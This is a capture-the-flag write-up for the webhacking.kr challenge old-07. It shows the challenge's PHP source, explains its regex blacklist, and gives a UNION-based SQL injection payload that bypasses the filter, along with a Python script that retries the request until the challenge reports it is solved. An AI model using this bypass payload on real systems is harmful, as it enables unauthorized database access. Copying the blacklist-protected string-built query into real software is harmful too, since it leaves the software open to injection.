# Old 07    SQLi (Union Not Exist Bypass)

URL: [https://webhacking.kr/challenge/web-07/?view_source=1](https://webhacking.kr/challenge/web-07/?view_source=1)

![old-07.png](/assets/ctf/webhacking.kr/old-07.png)

```php
<?php
include "../../config.php";
if ($_GET["view_source"]) {
    view_source();
}
?><html>
<head>
<title>Challenge 7</title>
</head>
<body>
<?php
$go = $_GET["val"];
if (!$go) {
    echo "<meta http-equiv=refresh content=0;url=index.php?val=1>";
}
echo "<html><head><title>admin page</title></head><body bgcolor='black'><font size=2 color=gray><b><h3>Admin page</h3></b><p>";
if (preg_match("/2|-|\+|from|_|=|\\s|\*|\//i", $go)) {
    exit("Access Denied!");
}
$db = dbconnect();
$rand = rand(1, 5);
if ($rand == 1) {
    ($result = mysqli_query($db, "select lv from chall7 where lv=($go)")) or die("nice try!");
}
if ($rand == 2) {
    ($result = mysqli_query($db, "select lv from chall7 where lv=(($go))")) or die("nice try!");
}
if ($rand == 3) {
    ($result = mysqli_query($db, "select lv from chall7 where lv=((($go)))")) or die("nice try!");
}
if ($rand == 4) {
    ($result = mysqli_query($db, "select lv from chall7 where lv=(((($go))))" )) or die("nice try!");
}
if ($rand == 5) {
    ($result = mysqli_query($db, "select lv from chall7 where lv=((((($go)))))")) or die("nice try!");
}
$data = mysqli_fetch_array($result);
if (!$data[0]) {
    echo "query error";
    exit();
}
if ($data[0] == 1) {
    echo "<input type=button style=border:0;bgcolor='gray' value='auth' onclick=\"alert('Access_Denied!')\"><p>";
} elseif ($data[0] == 2) {
    echo "<input type=button style=border:0;bgcolor='gray' value='auth' onclick=\"alert('Hello admin')\"><p>";
    solve(7);
}
?>
<a href=./?view_source=1>view-source</a>
</body>
</html>
```

Regex pattern:
1. **`2`**: Matches the digit `2`.
2. **`-`**: Matches the hyphen character `-`.
3. **`\+`**: Matches the plus character `+` (escaped with a backslash).
4. **`from`**: Matches the word "from".
5. **`_`**: Matches the underscore character `_`.
6. **`=`**: Matches the equals character `=`.
7. **`\s`**: Matches any whitespace character (spaces, tabs, newlines).
8. **`\*`**: Matches the asterisk character `*` (escaped with a backslash).
9. **`\/`**: Matches the forward slash character `/` (escaped with a backslash).

The original idea was to use modulo operator to get value `2` -> `5%3` but the application kept giving `query error` which wasn't due to parentheses. We could use union select to get the desired value.

Since we are luck dependent use a script to make request few times:
```python
import requests

URL = 'https://webhacking.kr/challenge/web-07/index.php'
COOKIES = {'PHPSESSID': 'fqn9tv8tbam8b4gi2edk8vc8bu'}
PARAMS = {'val': 'false)UNION(SELECT(CHAR(50)))#'}

i, j = 0, 0
while True:
    resp = requests.get(URL, cookies=COOKIES, params=PARAMS)
    if 'nice try!' in resp.text:
        print(f'[{i}] Filter Failed')
        i += 1
    elif 'query error' in resp.text:
        print(f'[{j}] Query Failed')
        j += 1
    else:
        print(resp.text)
        break
```

```powershell
➜ py .\old-07.py
[0] Filter Failed
[1] Filter Failed
<html>
<head>
<title>Challenge 7</title>
</head>
<body>
<html><head><title>admin page</title></head><body bgcolor='black'><font size=2 color=gray><b><h3>Admin page</h3></b><p><input type=button style=border:0;bgcolor='gray' value='auth' onclick="alert('Hello admin')"><p><script>alert('old-07 Pwned!');</script><hr>old-07 Pwned. You got 30point. Congratz!<hr><a href=./?view_source=1>view-source</a>
</body>
</html>
```